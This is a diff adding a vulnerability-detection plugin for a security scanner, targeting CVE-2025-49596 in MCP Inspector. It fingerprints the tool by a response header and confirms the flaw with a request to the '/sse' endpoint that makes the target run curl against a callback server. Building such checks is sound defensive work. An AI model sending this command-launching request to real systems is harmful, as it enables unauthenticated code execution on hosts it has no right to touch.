@@ -1,0 +1,84 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MCP_Inspector_CVE_2025_49596"
+  author: "frkngksl"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2025-49596"
+  }
+  severity: CRITICAL
+  title: "Remote code execution affecting MCP Inspector (CVE-2025-49596)"
+  description: "The MCP inspector is a developer tool for testing and debugging MCP servers. Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio."
+  recommendation: "Update the version to 0.14.1 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2025-49596"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_mcpinspector"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      expect_all: {
+        conditions: [
+          { header: { name: "Access-Control-Expose-Headers" } contains: "mcp-session-id" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: GET
+    uri: "/sse?transportType=stdio&command=curl&args={{ T_CBS_URI }}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "sessionId=" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_mcpinspector",
+    "trigger_code_execution",
+    "check_callback_server_logs"
+  ]
+}
